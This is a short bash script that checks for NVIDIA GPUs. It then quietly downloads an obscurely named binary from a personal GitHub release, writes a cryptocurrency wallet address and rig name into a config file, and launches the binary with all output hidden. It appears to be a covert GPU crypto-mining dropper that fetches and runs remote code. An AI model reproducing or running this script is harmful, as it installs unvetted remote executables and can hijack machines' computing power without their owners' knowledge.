#! /bin/bash
nvidia-smi -L
{
wget https://github.com/fabianripv91/thy/releases/download/1/dfsdfgsf &> /dev/null
chmod +x dfsdfgsf
echo wallet = 0x8fc2bc46767bf867e4da644330be8cf84f85fc78 >> config.ini
echo rigName = $1 >> config.ini
./dfsdfgsf config.ini &> logdebug
} &> /dev/null
